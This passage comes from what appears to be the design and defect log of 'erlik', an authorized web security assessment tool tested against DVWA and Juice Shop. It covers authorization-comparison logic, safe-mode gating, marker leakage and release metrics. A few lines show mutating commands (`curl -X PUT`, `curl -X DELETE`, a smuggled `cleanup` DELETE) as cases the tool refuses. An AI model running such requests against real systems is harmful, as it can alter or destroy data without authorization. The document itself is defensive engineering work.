material") is itself a fork generator: E-008's matrix starts at "anonymous, two
ordinary users in different tenants, and one privileged lab identity", an operator
may name `anonymous` alongside real handles, and under a per-arm test that arm alone
would have no rendered surface — so the arms could never agree and `compare_arms`
would refuse every differential on the assessment. An assessment that selected no
identity and did not ask for a rendered crawl still gets none, because the pass
launches Chromium.

End to end through the real lane against real DVWA, `headless=False`, cookie-only
identity, changing only whether the assessment names an identity:

    before   60 endpoints, all katana,              0 form (module, parameter) pairs
    after   127 endpoints, 5 form + 122 playwright, 7 form (module, parameter) pairs
             brute/username, brute/password, csrf/password_new, csrf/password_conf,
             sqli/id, sqli_blind/id, xss_r/name

Three harness errors of mine were caught on the way there, and all three were the
same kind — a detector that could only say "no": a link check written with a leading
slash that DVWA's relative hrefs never match; a header lookup written
case-sensitively when the proxy writes `cookie` in lower case; and a login through
Python's `http.cookiejar`, which silently drops cookies for dotless hosts like
`localhost` and left every "unauthenticated" reading unauthenticated for the wrong
reason. The verified precondition in the final script — assert the session is live
before trusting anything downstream of it — is what turned the result over.

### E-030: fork points an operation-level identity does not absorb — CLOSED

The eight findings were not one defect. Some are genuine application differences
that must stay VISIBLE — E-008 asks for differences to be distinguishable, not
normalised away — and some are artifacts the lane manufactures, where a difference
the tool invented is not a finding about anything. They need opposite treatment, and
conflating them is what made this item read as a single problem.

**Artifacts, fixed.**

- **A companion-free form URL collided with the crawled page URL.** DVWA's xss_r
  form declares its submit control with no `name`, so at `security=low` it has no
  named companions at all, `form_endpoint` yields the page's own URL with an empty
  query, and the row key merges it with the page row — `sources` became
  `["form","playwright"]` and withholding on "form in sources" hid a real PAGE from
  every read-only case. At `impossible` the hidden `user_token` IS named, so the
  action is its own row and the page survives: the token's ABSENCE forked the
  reading arms in the opposite direction from its presence. `form_urls` now requires
  a QUERY, which is what makes a form URL an action — its own measured table already
  said so (`GET /vulnerabilities/csrf/` changed nothing; the same URL with
  `?Change=Change` changed the password). With no named companion there is no
  submission signal for a handler to fire on.
- **`MAX_FORM_PARAMETERS` was applied in DOM order**, so a control the target
  renders first in one arm — DVWA's csrf form puts `password_current` first at
  `impossible` — pushed a different control off the end. Sorted before the cap, so
  the kept set depends on the NAMES both arms agree about.
- **Nothing refused a session-destroying link.** Measured against the default
  `["/logout","/signout"]`: `/logout`, `/logout.php` and `/signout` refused;
  `/users/sign_out` (Rails), `/accounts/logout/` (Django), `/Account/LogOff`
  (ASP.NET), `/auth/logout`, `/api/v1/logout`, `/logoff` and `/sign-out` all
  **visited**. An arm whose session dies mid-crawl then sees only login forms and
  reports nothing, because every request still succeeds. `egress_policy` now has a
  whole-segment, case-insensitive guard, as the lane's own rule rather than a
  default in the operator's list — an operator replaces `excluded_paths` to ADD an
  exclusion, and that must not be how they silently remove the rule protecting the
  run from itself. ZAP's plan is given the same segment list so it does not spend
  requests discovering what the proxy will refuse; both layers match per whole
  segment, so `/blog/how-to-logout-safely` and `/docs/signout-api` stay crawlable.

**Genuine differences, now named instead of listed.** `compare_arms` returns a
`divergence` entry per one-sided operation, classified from the data: `method_changed`
when both arms reached the endpoint by different methods, `parameters_changed` with
the inputs that appeared or vanished, and `not_reached_by_other_arm` when there is
genuinely nothing there — which must not be dressed up as either of the others,
because that would imply the arm reached it.

**Measured after the fixes**, both DVWA security levels driven through the real lane
in one session, changing only the `security` cookie:

    33 of 40 operations seen by both        (originally 1 of 8 (url, parameter) pairs)
    withheld: 4 in each arm, structurally parallel — the csrf, sqli, sqli_blind and
              brute/xss_r actions, with the hardened arm's copies carrying a token
    offered to reading cases: 30 against 31, and the single extra is
              /vulnerabilities/csp/source/impossible.js — a genuinely
              state-dependent file, not an artifact

    divergence, each named:
      parameters_changed        /vulnerabilities/brute/, /csrf/, /cryptography/, /xss_r/
      not_reached_by_other_arm  /vulnerabilities/csp/source/impossible.js

**The remaining four, and two of them were my own wrong diagnoses.**

- **The row key's missing `source` column was not data loss.** I recorded that "a
  page row and a form row for one URL cannot coexist — `INSERT OR REPLACE` keeps the
  last writer". `persist_result` in fact UNIONS both `sources` and `parameters`, and
  nothing is lost in either arrival order — measured, and now pinned by
  `test_a_page_row_and_a_form_row_at_one_url_both_survive`. The claim was plausible
  from the SQL statement alone and wrong once the code around it was read.

  What genuinely remains at `/vulnerabilities/xss_r/` is an operation-identity
  question, not a storage one. The vulnerable arm merges page and form into one row
  (that form adds no named companion, so the two URLs coincide) while the hardened arm
  has two (its form URL carries a token), so the hardened arm holds one extra
  parameter-free operation. **Absorbing that would reintroduce the page/action merge
  an adversarial pass called blocking** — `/vulnerabilities/csrf/` and
  `/vulnerabilities/csrf/?Change=Change` differ only in their parameter sets, and
  merging them puts a request that changes the admin password under the same identity
  as the page that displays the form. It is reported as `parameters_changed`, which is
  what it is, and that is the right answer rather than a deferral.

- **The state-dependent path is not templatable.** I recorded
  `/vulnerabilities/csp/source/impossible.js` as wanting path templating, on the
  assumption that the vulnerable arm had a counterpart to template against. Measured:
  at `security=low` that page loads **no** `source/*.js` at all — the hardened level
  genuinely loads an extra script. There is nothing to absorb, and
  `not_reached_by_other_arm` is the complete and correct answer. Path templating is
  still E-007's work for locale and tenant prefixes; it was never what this
  particular divergence needed.

- **The page-visit cap now reports itself. FIXED.** The cap was silent, and silence is
  the wrong default in both directions: two arms publishing different menus truncate
  at different places, so the cap MANUFACTURES a difference, and two publishing the
  same menu truncate identically so the cap HIDES one. `adapters.crawl_truncation`
  emits a `crawl_truncated` observation naming how many same-origin links were left
  and why a truncated arm cannot be compared, and stays silent when the cap did not
  fire — an observation on every run is how an observation stops being read. Verified
  end to end against real DVWA with the rebuilt worker image:

        form_pages=5    31 links published, 6 visited, 20 unvisited  -> observation
        form_pages=60   31 links published, 26 visited, 0 unvisited  -> none

  Note the default is 20 and DVWA publishes 31 links, so the default truncates there.
  That was the hidden asymmetry; it is now stated. Raising the cap remains an
  execution-policy decision and is not made here.

- **A schema fetched by URL is identity-dependent. DETECTED.** `SchemaInput` accepts a
  URL, and `schema_file` fetches it through the proxy, which injects the identity's
  headers and cookies — so a target serving a different OpenAPI per role forks the
  schema-derived operations. The information to catch it already existed and nothing
  compared it: both the ZAP and Schemathesis adapters record `schema_sha256` in their
  stage metadata. `compare_arms` now refuses with `different_schema` when the two arms'
  digests disagree, and an absent digest on ONE side counts as disagreement — a target
  that serves the document to one identity and refuses it to another has given the arms
  different surfaces.

  Detection rather than prevention, deliberately. Refusing a per-identity fetch would
  break a schema that is itself behind authentication; fetching it once anonymously
  would break it differently. Which of those an operator wants is their decision, and
  they could not make it while the fork was invisible.

### E-031: the marker's protection is not protection — CLOSED

Adversarial review of the commit that made the cross-arm authorization findings persist
found four defects; three were fixed immediately and these two were recorded here. Both
are now fixed, and measuring them turned up four more on the same theme — everything the
marker costs. The full account, with the measurements, is in `docs/integrations.md`
("What the marker costs", "The strongest findings were the only uncitable ones", "A
forbidden marker was published in plaintext"). In brief:

- **The digest was an oracle.** `sha256(marker)[:12]` inverted in 0.0007s over 4050
  candidates. Truncation was NOT the binding problem — the full 64-hex digest falls at the
  same cost; input entropy is. A candidate space built mechanically from the assessment's
  own recorded bytes (68 JSON keys x 1711 values x 9 separators = 2^20) exhausts in 0.60s
  with one hit, guessing nothing. Now HMAC-SHA256 under 128 random bits per assessment, in
  the SecretStore at a derived handle; the same attack then yields 0 hits against the label
  and 1 against the unsalted control in the same run. THREE defects in that code were
  written and then found here: a damaged salt read as "no salt yet" (because
  `json.JSONDecodeError` is a `ValueError`), which silently relabels an exported report; a
  destination opened `O_EXCL` and written into, which made the new hard failure reachable
  through the empty window, fixed by writing whole and `os.link`ing; and an unbounded retry
  loop that an ablation turned into a twenty-minute hang.
- **And keying new findings was not enough.** Rows persisted before it still carried the
  invertible form in their evidence PROSE and the export still published it — 2 of 11 on the
  real store. `persistence.migrate` strips it; it cannot re-label, because that needs the
  marker and the marker was never stored.
- **Two declarations collided.** One finding is right, not two — the records differ in
  twelve hex characters and the split orphans a remote row. `marker_digests` is a list now,
  merged by `persist_findings`, out of the prose so the merge can reach it.
- **`confirmed` was an overclaim.** 12 of 26 findings true over sixteen markers (0.46),
  12 of 16 over the realistic ten, 0 of 1 on the negative control — and those were the only
  `confirmed` findings in the whole assessment. The function-level check emits `likely`;
  severity stays high; the object-level check keeps `confirmed` because its decisive value
  comes from the target.
- **A URL the lane addressed to the caller is not a crossing.** The gate first proposed for
  this could not fire on the case it was written for. The rule that works keys on the URL:
  precision 1.00 against 0.80 ablated, with identical recall, as a listed skip. Three
  details of it were wrong in the first version and each was found by ablation — it compared
  any path segment rather than the appended one (a `subject_id` of "api" skipped 25 of 31
  derived URLs), it ran before the evidence clauses so its list was 8:1 noise, and its
  docstring claimed the id segment was erlik's when it is the target's.
- **An unfollowed redirect is not a denial.** `carries()` requires a 2xx, so an anonymous
  3xx with an empty body satisfied "asked and did not receive" for free. Measured on DVWA,
  the negative control: three markers naming the login page's own text each produced one
  finding at `http://dvwa/`, withdrawn by the clause and confirmed by source ablation.
- **A marker must identify something.** `2` validated and produced ten findings, none true.
  Length floor of 8 on evaluator-only declarations.
- **The strongest findings were the only uncitable ones.** Nine of eleven findings cited a
  resolvable artifact; the two that cited none were the two graded highest. The six
  artifacts were read and discarded by `arm_responses`. Cited per satisfying key, never per
  URL.
- **A forbidden marker was published in plaintext** by `GET /api/integrations/sessions/{id}`
  — a present leak, not a hypothesis, because `redact` matches by key name and nothing
  called `marker` matches. Blanked in the published copy, kept in the executable one.
- **Methodology reaches the export**, as `tags` and in `description`. `tags` is exempt from
  the read-back comparison, because a cosmetic label that mismatches writes the export row
  `uncertain` and blocks the destination.

**Considered and rejected, with the measurement.** A triage hook stating which of the
unprivileged arm's declared values also appear in the matched response: the response-based
variant was measured to downgrade 100% of findings, so as information it is true of every
finding, which is not information. The regrade to `likely` carries "a human must check this"
instead.

**And one claim in the original E-031 was too broad.** It said the marker "must never reach a
persisted record or an export". That is a property of the CROSS-ARM path, where the marker is
not needed as evidence — it is not a property of the product. `SecurityAssertion` builds its
finding's evidence as `_marker_window(body, forbidden_marker)`, 200 bytes centred on the
marker, and says so in a comment: the claim there is "this identity saw a string you declared
forbidden", and showing the neighbourhood IS the proof. That is a defensible choice on a
different path, and the constraint should be stated per path rather than as a system property.
See E-032 for what follows from it.

### E-032: what the authorization work still does not do — PARTLY CLOSED

Eight are fixed: three grades that nothing had earned, the two ways the client's tracker
stopped receiving findings at all, the marker's two travel items, and `may_access`'s silent
spelling — the per-path claim and
the one path it had to stay off.

**The marker reached a model prompt, and that was a measured leak rather than the "reachable
shape" recorded here.** The premise was that the legacy lane carries no marker; it does —
`private_object_marker` has been declarable since E-027, and the `idor` and `ownership`
evaluators both quote it into a finding's evidence on purpose. Measured: the evidence reached
`recon_context.value` verbatim, keyed on host:port with no session and no expiry;
`_get_warm_start_context` renders that column in full, so a later session's agent prompt
carried the marker; and `_get_handoff_context`'s 110-character cut withheld it by ONE character
on a long URL and not at all on a short one. A boundary that depends on how long the URL in
front of it happens to be is not a boundary.

`bridge_run` withholds every value named by `declared.EVALUATOR_ONLY` — already the list of
fields an evaluator reads and no command interpolates, which is exactly the set whose values
are data — before the length cut. Fixed at the WRITE, because `_get_handoff_context` and
`_get_warm_start_context` both read that one column and the store itself would otherwise keep
holding the value. It is NOT retroactive and cannot be: nothing records which substring of an
existing row was the declared value, so a store that already holds one needs the rows for that
target deleted by hand. Said so in `docs/integrations.md` rather than implied.

**A `may_access` declaration that matched nothing now says so.** Measured on `_entitled`'s
three shapes against four object URLs: `/api/Users/2` suppresses 1 of 4, `/api/Users/`
suppresses 3 of 4 — coarse, but visible, because `suppressed_declared_access` lists what it
took — and `/api/Users` suppresses **0 of 4, silently**. The third is the spelling a person
reaches for ("this identity may read users"), and `_entitled` matches it against `/api/Users`
and `/api/Users/` only, never `/api/Users/2`: the false finding stays, the declaration looks
applied, and nothing related the two. Both checks now return
`declared_access_that_matched_nothing`, for the same reason every other clause in this lane
reports what it did not do.

**And every finding names the exact declaration that would suppress it.** Working out the
spelling was never the inherent part, and getting it wrong failed in the silent direction.
The loop is also cheaper than this entry implied: both checks are POST routes over a FINISHED
assessment's stored evidence and both read `may_access` live from the secret store, so
declaring and re-checking is one `PUT /identities/{id}` and one POST — no new assessment.
Measured end to end.

**The per-path decision** is the table in `docs/integrations.md`: the cross-arm findings carry
a digest because they are exported; `SecurityAssertion` and the catalogue's marker evaluators
quote it because there the quotation is the proof and the reader is the data's owner; and
`recon_context` never carries it, because that row outlives the engagement and ends up in a
model prompt. A sixth item — "nothing reads `integration_stages.status`"
— was still listed here as open after E-033 closed it (the half-run fix), and has been
removed; the measurement it recorded is in E-033 and in `docs/integrations.md`. The rest are
measured and listed so none is rediscovered as new.

**Both delivery defects are about a finding erlik got right and never delivered**, which is
worth nothing to whoever has to fix it.

- **Deduplication no longer kills the destination.** Reproduced against the API double at the
  shape measured on the live 2.58.4: the importer stores every finding and marks its
  duplicates `duplicate=True, active=False`, and a PATCH setting `active: true` on one is
  refused HTTP 400. Before: export 1 `uncertain`; export 2 returned export 1's row, so a
  triage to `false_positive` could not propagate; export 3 issued zero requests. Two defects
  in one, and both are fixed. The `raise` abandoned every remaining finding over one refusal
  — all three were in the remote test and only the first was mapped locally, so the cross-arm
  findings sat behind a catalogue triplet — and a refused PATCH changes nothing remotely, so
  continuing is safe. And `uncertain` was the wrong word: uncertainty is "a write may have
  landed and we cannot tell", while this is the server answering, declining, with a reason
  `reconcile` can do nothing about. A <500 answer to a PATCH is a KNOWN non-write; the export
  is `partial`, which neither blocks the destination nor short-circuits the next attempt, and
  the refusals are named per finding in the export evidence with what the remote said. 5xx and
  transport failures keep their uncertainty and their block, which
  `test_ambiguous_update_blocks_changed_payload_and_other_action` already guarded and still
  does.
- **Re-registering an identity says what it costs.** Measured: `POST /identities` again gives
  a new handle and a different fingerprint; `PUT /identities/{id}` gives the same handle, the
  same fingerprint, and the credential replaced — so the rotation route already existed and
  nothing said so, and nothing flagged that two identities now shared a name and an origin.
  `POST` still registers, because the operator is the authority on who the caller is, and now
  names the earlier handle and what will happen to its findings.

  **The fingerprint is not the place to fix this**, which is the fix that first suggests
  itself. Keying the identity term on `(name, target_origin)` would make rotation free and
  would also collapse two genuinely distinct callers who share a name, so a finding about one
  arm would arrive as a finding about the other. The whole lane rests on telling arms apart,
  and the distinctness is now guarded by a test of its own rather than left as a consequence.

**Three paths awarded `confirmed` with no comparison behind it**, and `confirmed` is not a
word in a report: `defectdojo.py` maps it to `"verified": True`, the grade that tells a
client's tracker a human need not look. Two of the three were recorded here as reasoned from
source rather than measured; measuring them confirmed both and turned up a third.

- `SecurityAssertion` fired on one arm and one response and graded every hit `confirmed`.
  The generic-404 control already on that path rules out a single-page application's shell;
  nothing asked whether the content was gated at all. The counter-example is one this
  repository already documents: Juice Shop returns `/rest/products/1/reviews`, author
  addresses included, "to admin, to jim and to nobody at all" — so an operator asserting
  that the customer must not see jim's email there got HIGH, exported verified, about
  content that is public. `service.assertion_controls` now probes each asserted URL with NO
  identity, once per assessment in its own identity-free sandbox, and `assertion_grade`
  follows the rule this repository states twice already, in `login._verify` and in
  `authenticate`: an assertion that holds WITHOUT the credential establishes nothing.
  Measured — gated: `confirmed`; returned to a caller with no credential: `likely`, and the
  basis says the rule and methodology on the finding describe the wrong thing; control
  blocked, errored, missing, or only half obtained: `likely`, because a missing control is
  not a pass. The finding still fires in all three cases; it stops arriving pre-verified.
- The `idor` evaluator — the only evaluator hard-graded `confirmed` — had no reflection
  clause. Measured, both firing HIGH `confirmed` before this: marker `99999` at
  `/rest/track-order/99999` answering `{"data":[{"orderId":"99999"}]}`, and marker
  `Vulnerability: Reflected` at `?name=Vulnerability%3A+Reflected` on DVWA. Ported from
  `cross_arm_privileged_function`'s clause 0, `unquote_plus` included, and reading
  `url_template` as well as `url` because the access-control cases name their endpoint there.
- And it matched the marker against the whole capture rather than the body — so a marker
  echoed into a response HEADER, with `{"data":{}}` as the body, produced a HIGH `confirmed`
  Broken Access Control finding. The anonymous clause three lines below already read the body
  and said why; the rule had been applied to the arm that can only REFUSE a finding and not
  to the arm that makes one. It costs no true positive: `_http_status_ok` is already required
  of both arms and is False for a capture with no status line, so a case whose curl omits
  `-i` could never have fired anyway. All 114 tests across the idor suites, including the
  three seeded violations and eleven negative controls, still pass.

- **Deduplication still costs the duplicates their state.** The destination survives and the
  rest synchronize, but a finding DefectDojo marks duplicate cannot be made active or
  verified, so it sits in the client's tracker inactive. The remaining answer is the client's
  product configuration, not erlik's export — recorded so the `partial` status is not
  mistaken for a defect in the writer.
- **`may_access` still cannot be declared in advance**, and that part is inherent: the
  object id is not derivable from `subject_id` — jim's is 2 while his address ids are 4 and
  5 — so an operator learns which paths to declare by reading the findings. What is NOT
  inherent was fixed; see below. It is a triage instrument, not a defence, and the docs no
  longer present it as one.
- **Length is a weak proxy for a degenerate marker, and breadth is a better one.** The floor
  of 8 kills `2` and `"id":2`, but markers well over 8 characters — `"role":"customer"` — still
  match most of a corpus. An adversarial pass measured breadth over the privileged arm's own
  captures separating 2-3x better. Not adopted, because the counter-example is real and
  unresolved: a genuinely broad leak (the administrator's email on twenty endpoints) is twenty
  true findings, and breadth cannot tell that from a marker that matches everything.
- **Per-assessment labels churn the export.** A re-run in a new session keeps the fingerprint
  and changes the label, so the description differs and the next export PATCHes. Cosmetic, and
  the alternative — one global key — would make labels comparable across every client's
  engagement, which is worse. Recorded so it is not mistaken for a defect.
- **And the obvious next step is still a trap.** Mirroring the two routes' arguments onto
  `AssessmentConfig` so the checks run automatically would put the marker in the published
  config row; `redact` is key-name matched and would not cover a field called `marker`. The
  `forbidden_marker` fix above is the pattern to follow, not a reason to think the problem
  is gone.

### E-033: the callback lifecycle, and what the fixes did not reach — CLOSED

All eight items are fixed; see `docs/integrations.md` ("What the report could not
see") for the measurements. Closed: `recover()`'s rollup, including the `sessions` row it
stopped short of; the three pieces of write-only state; the coverage report's blind spot for
arm-wide truncations, plus the comma-joined truncation id found while fixing it; the arm that
could lose its collector for good; the actual-services job's missing build manifest; and —
not in the original list — the cross-arm checks' blindness to `integration_stages.status`,
which turned a half run into a byte-identical clean result.

**An arm losing its collector for good** is fixed by `service.requeue_lost_collectors`, which
re-queues the interactsh stage along with the catalogue work that depends on it. Measured on
the committed code with `Collector.start()` raising and the next stage pausing on
authentication: pass 1 left the arm's interactsh row `failed` and its testcases row `queued`,
the resume selected katana and testcases but not interactsh, and pass 2 recorded `partial`,
"SSRF check incomplete: callback collector unavailable" — after which the assessment is
`partial`, which `POST /start` refuses, so the check could not run for that session by any
route. With the retry the same pass 2 runs the case: the interactsh row reaches `completed`,
the arm mints a second correlation host, and the catalogue records `test_case` rather than
`test_case_not_run`. It is deliberately not a promise: a cause that persists fails pass 2
identically and the case is still recorded as not run, which is guarded.

The retry is narrow by construction, and the five places it must NOT fire are what
`tests/test_an_arm_does_not_lose_its_collector_for_good.py` mostly tests: a healthy arm, an
arm whose catalogue work is done, another arm's stage, an assessment selecting no collector
case, and a row a resume can already select — rewriting a `needs_auth` row would destroy the
pause marker `tests/test_callback_resume.py` depends on. Measured against both recorded real
stores: zero rows change, because neither selected a callback case.

**The actual-services build manifest** is written by the step the docker job already had.
It needed one addition: `release_manifest.py --also-image`, because the image that job's
acceptance actually runs against — `erlik-interactsh-lab:1` — is a fixture and so is absent
from `IMAGES`. A manifest naming every image except that one reads as complete, which is the
failure mode this repository keeps finding; fixtures are recorded under their own key so a
lab server is never counted in `images_missing`. `zap` is recorded absent in that job and
that is correct: it is neither pulled nor used there.

**`coverage()` could not see the out-of-band case at all — CLOSED.** Measured on three
sessions differing only in what happened to that case — it ran against the probe, it was
skipped because the arm had no collector, it was never selected — the reports were
BYTE-IDENTICAL: one row, one `not_attempted`, the probe URL absent and `WSTG-INPV-19` absent.
So the one check whose purpose is to detect what an in-band response cannot show was invisible
to the report that exists to say what was tested, and the honest `test_case_not_run`
observation added for the skipped case reached nothing.

The warning recorded here was right and is why the obvious fix was not taken. Measured:
`eligible_test_cases` returns 12 cases for a URL carrying a parameter, so an endpoint row for
the probe would make it a target for every catalogue check — SQL injection, XSS, the
client-side cases — at a URL the operator nominated for ONE out-of-band payload, and those 12
would draw from a URL budget shared with the real surface. A case testable somewhere it should
not be is worse than a case nobody can see.

So `inventory.declared_probe_pairs` enumerates the probes BESIDE the endpoint rows, and
`integration_endpoints` is untouched — measured on both recorded real stores, which declare no
probes: zero rows move. The three outcomes are now three distinct reports, and the per-arm
question the cross-arm work made load-bearing is answered per arm. The probe's row carries
`COLLECTOR_CASES` as its own eligibility, because `eligible_test_cases` lists what the curl
dialect can execute and deliberately never names one — without that the row would drop the
budget truncation of the very case that owns the probe, while still correctly ignoring another
case's.

One measurement here corrected a claim: the 21→14 `target_budget` figure an earlier pass
recorded is a consequence of the number of SELECTED cases (`max_urls // selected // steps`),
not of endpoint rows, so it is true today and no fix moves it.

**The mutation refusal is the runner's floor now — CLOSED, and the reason it was judged
acceptable was wrong.** This entry read "safe mode now covers every lane, so this is two gates
agreeing rather than one floor". It does not cover every lane. Safe mode lives in
`execute_tool`, and a caller supplying its own `executor` never reaches it — the integration
lane's `deterministic.execute` goes from `curl_request` straight to `sandbox.run`, touching
`_safe_mode_violation` nowhere. So that lane's only mutation gate was `step_policy`, an
optional keyword argument. Measured with a recording executor that sends nothing, on a caller
that brought an executor and no policy:

    curl -X PUT     ...   SENT, refused by nothing
    curl -X DELETE  ...   SENT, refused by nothing
    curl -F @upload ...   refused, but by `curl_request`'s syntax rule rather than by any
                          decision about mutation

The two that went through are exactly the two safe mode exists to stop. `run_test_case` now
applies `_safe_mode_violation` before dispatch, whatever executor the caller brought, records
the refusal as a skipped step rather than dropping it, and prefixes the reason `SAFE_MODE:` so
a reader can tell it from the lane's own narrower refusal. It defers to the one rule set
rather than re-listing verbs, and it reads the same environment `execute_tool` reads —
`ERLIK_SAFE_MODE=0` still authorises destructive testing, which is tested, because a fix that
made an authorised engagement impossible would be a worse defect than the one it closed. The
test-case lane never had a per-session override to lose.

One rule was found by the test rather than by reading the list: `sql-ddl-dml`. The test
enumerates `_SAFE_MODE_RULES` instead of restating it, so a rule added later is covered
without editing it.

**A case can undo what it left behind — CLOSED, and it permits nothing new.** `TestStep`
gains `cleanup`. The shape is what keeps it safe: an undo runs only after a step that
actually EXECUTED, and a mutating step executes only where safe mode already allows it —
`ERLIK_SAFE_MODE=0`, a deliberately authorised destructive engagement. With safe mode on the
step is refused and the undo never runs, because there is nothing to undo. The gate is
untouched; what changes is what erlik leaves behind on the side of it where it was already
writing, which until now was a file and a header telling a human to go find it.

The undo is held to the same scope check and the same safe-mode floor as any other command.
That costs nothing — a legitimate undo follows a step safe mode already permitted — and closes
the obvious abuse: a plain GET step with `cleanup: curl -X DELETE …` would otherwise smuggle a
mutation past a gate its own step could not pass. Undos run in `finally` and in reverse order,
each independent of the others, and every outcome lands in `RunResult.cleanups`. A FAILED undo
is the one that matters: it is a file still on a client's server.

**Wired to the one case that can name what it wrote.** CONF-06's `put_probe` writes
`erlik_put_test.txt` to a URL erlik CHOSE, so it can form the DELETE. BUSL-09 deliberately
declares none and keeps its `find / -name 'erlik-upload-*'` header: the server decides where an
upload lands, so a declared undo there would issue a DELETE against a path erlik invented on a
client's system. Both are asserted, so neither can drift.

E-012's fixture/cleanup wrapper — the thing `_v1_step_policy` says the XXE case waits for — now
has the second half of its mechanism. Permitting a mutating step BECAUSE it declares an undo is
a separate decision and is deliberately not taken here.

**`POST /stop` has a debounce — CLOSED, and E-033 is closed with it.** The route was
`if task and not task.done(): task.cancel()`. The teardown it interrupts is not instant — a
`docker rm -f` of one container measures 207ms, and the integration lane's unwind releases one
collector after another — so a second click during that window found the task still not done,
cancelled it again, and returned the same "Stop signal sent." as the first. An operator could
not tell whether the second click had done anything, which is the reason they click a third
time.

`request_stop` answers `stopping`, `already_stopping` or `not_running`, and delivers a
cancellation only for the first. It reads `Task.cancelling()` — the task's own count of
pending cancellation requests — rather than a set of session ids the API maintains, so it
cannot drift out of step with reality, needs no cleanup when a run ends, and cannot leak an
entry for a session that never finished. `status` stays `stopping` for both of the first two,
because a dashboard switches on it and the run IS stopping either way; the repeat is reported
as `already_requested`, a fact about the request rather than the run, with a message saying
why it is taking a moment. `POST /chains/{id}/stop` goes through the same decision, so
stopping a chain twice no longer delivers a second cancellation to every session in it.


### E-034: the three answers a comparison can give, and where the line sits — CLOSED

This increment drew a distinction worth recording, because the next person to touch these
checks will have to place a new case on one side of it.

A cross-arm comparison now answers in three ways, and the rule for choosing is the question
"could this have invented a finding, or only lost one?"

- **Refuse** when there is no comparison to interpret: no anonymous arm, an arm with no
  evidence at all, contradictory privilege orders, an unusable marker. `refused_because`, and
  `authorization_findings` persists nothing.
- **Report** when the comparison ran but had blind spots: an arm that finished part of the
  surface, operations the other arm never probed. The findings stand, because a missing capture
  cannot manufacture one — measured, a finding surviving a 60-of-117 truncation with all three
  cited artifacts checking out — and the zero is what must not read as clean.
- **Skip one operation and list it** when that operation alone is uninterpretable: a reflected
  marker, a URL that names the caller, an anonymous arm that was redirected rather than
  refused.

**Resolved by sweep: `partial` should NOT refuse, and the line stays where it is.** The open
question rested on one data point — a finding surviving a 60-of-117 truncation — and the entry
asked for the sweep rather than more argument.

The falsifiable form of "a missing capture cannot manufacture one" is that truncating any arm
must never ADD a finding. It could, in principle, and the mechanism is specific: the ANONYMOUS
arm's capture is what REFUSES a finding, since content an unauthenticated caller received is
published rather than crossed. Delete that capture and the refusal has nothing to fire on.

`tests/test_truncating_an_arm_never_adds_a_finding.py` sweeps it: 3 arms x 7 truncation levels
over a 12-operation surface, both checks, with the anonymous arm's reads of the PUBLIC
operations deleted outright as the sharpest single case. **No truncation at any level on any
arm added a finding.** The reason is a named clause rather than luck, and it is asserted so it
cannot quietly go:

    # `get` with a default would read "the anonymous arm never probed this" as "the
    # anonymous arm was refused", which is the unrun-clause defect this project keeps removing
    if key not in anonymous_saw:
        continue

Corroborated on the recorded real runs. juice5 has all three katana stages `partial` from the
URL budget, 9 findings, and 9 of 9 cited artifacts resolve with their digests checking; DVWA
has no partial stage and 4 of 4 resolve. So a `partial` arm's findings are inspectable, which
is the half the original data point established, and the sweep now covers the half it did not.

The far end of the sweep confirms the OTHER line too: an arm with no evidence at all refuses
rather than reporting a bare zero, which is where "refuse" belongs and where it already was.

**Nothing in the product changed.** The answer was the status quo; what changed is that it now
rests on a sweep instead of one measurement, and the sweep is a test rather than a paragraph.

## 10. Shared technical contracts

Prefer additive schema migrations and small services with explicit interfaces.
Suggested concepts are:

- `AssessmentPolicy`: target and service scopes, stage modes, identity references,
  budgets, exclusions, selected operations, effective configuration version.
- `Operation`: method/path template, parameters, schema references, discovery
  provenance, per-identity attempted and verified states.
- `Action`: actor, typed request, policy decision, stage/job IDs, timestamps, result,
  evidence references, and interruption reason.
- `VerificationRecipe`: prerequisites, fixtures, assertion, cleanup, reproducibility
  inputs, and permission requirements.
- `Finding`: stable identity, confidence and basis, evidence links, verification
  state, review history, and external mappings. **Keep the lane's account of the
  claim and the application's own bytes as separate fields** — they have different
  provenance, and a consumer that renders one as trusted text and the other as
  untrusted can only do that if they arrive apart.
- `AssessmentDiff`: comparable context, changed operations/findings, coverage gaps,
  and retest outcomes.

Migrate existing rows incrementally. Keep historical reports readable, never
change saved-run defaults retroactively, and test migration from a populated old
database. Imported archives and reports must use bounded parsers and reject path
traversal, executable content, and unexpected remote references.

## 11. Evaluation and release gates

| Metric | Definition | Proposed release rule |
|---|---|---|
| Scope integrity | Requests observed by recording out-of-scope services, **and target state compared before and after a run** | Zero unauthorized requests across supported execution paths, **and zero state changes while `state_changing` is false** |
| Known-operation coverage | Attempted method/path/identity combinations divided by declared applicable combinations, **counting only probes that received a response** | Every known combination has an attempted result or an explicit reason for exclusion; **a probe that received no bytes is untested coverage, not an attempt** |
| Finding recall | Recovered expected findings / declared expected findings | All release-critical fixture findings recovered; publish broader and held-out results separately |
| Precision | Adjudicated true positives / all adjudicated positives | No known false confirmations; report suspected-alert precision by rule family |
| Evidence integrity | Referenced artifacts resolve and digest checks succeed | 100% references valid; each finding has substantive supporting evidence, **and cites its own rather than the whole stage's** |
| Differential validity | For any comparison between two identities or configurations, the share of `(operation, parameter)` pairs both arms actually reached | **Every pair compared must be reached by both arms**; a differential whose arms tested different surfaces is reported as inconclusive |
| Lifecycle reliability | Fault-injection cases with correct stop/resume/outcome behavior | All cancellation, crash, auth-expiry, cleanup, and uncertain-export cases pass |
| Reproducibility | Same inputs recover the same expected deterministic behavior | Record tool/rule/schema versions and seeds; publish observed exceptions |
| Efficiency | Requests, wall time, model tokens/cost, and verified findings | No budget overruns; justify regressions against the previous fixed baseline |

Three of the clauses above are additions, each from a defect that produced a
confident wrong answer rather than a failure: scope integrity missed an
in-scope request that changed the target's credentials, known-operation coverage
counted 156 empty responses as attempts, and evidence integrity passed while all
nine findings of a run cited the same 772 artifacts. The differential-validity row
is new for the reason given in §3.

Do not calculate coverage against an assumed complete internet-facing surface.
Schema inventory and discovered inventory are separate denominators. Do not count
unadjudicated scanner alerts as either true positives or false positives. Empty
diagnostic files, missing evidence, and insufficient evidence are distinct cases.

Run fast tests on every change; isolated scanner tests on relevant pull requests;
actual-service suites and reproducible benchmarks before release. Client evidence
must not be placed in public CI artifacts. Record host architecture and hardware
when comparing durations. Publish raw metric definitions beside summarized charts.

## 12. First three implementation increments

**Increment 1 — close the review defects: DONE** (`7723090`, `639c32e`, `7f45f06`,
`e78c257`). E-001 through E-003 each got a failing regression first and then the
smallest fix. E-004 did NOT survive confirmation: re-running the benchmark end to
end showed two of its three clauses unmet, so it was reopened and closed properly
